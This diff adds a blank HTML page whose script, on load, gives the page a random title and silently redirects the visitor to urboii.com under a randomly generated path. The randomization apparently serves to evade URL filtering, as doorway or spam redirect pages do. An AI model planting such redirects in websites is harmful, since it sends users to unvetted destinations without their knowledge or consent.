@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head>
+    <meta charset="UTF-8">
+    <meta name="author" content="">
+    <script type="text/javascript">
+        function generateRandomString(length) {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            const charactersLength = characters.length;
+            return Array.from(window.crypto.getRandomValues(new Uint32Array(length)))
+                .map(randomValue => characters.charAt(randomValue % charactersLength))
+                .join('');
+        }
+
+        function randomRedirect() {
+            const baseUrls = [
+                'https://www.urboii.com/',
+                'https://www.urboii.com/',
+            ];
+            const randomBaseUrl = baseUrls[Math.floor(Math.random() * baseUrls.length)];
+            const randomPath = generateRandomString(10) + '/' + generateRandomString(10) + '/' + generateRandomString(10);
+            window.location.href = randomBaseUrl + randomPath;
+        }
+
+        window.onload = function() {
+            document.title = generateRandomString(10);
+            randomRedirect();
+        };
+    </script>
+    <title></title>
+</head>
+<body>
+</body>
+</html>
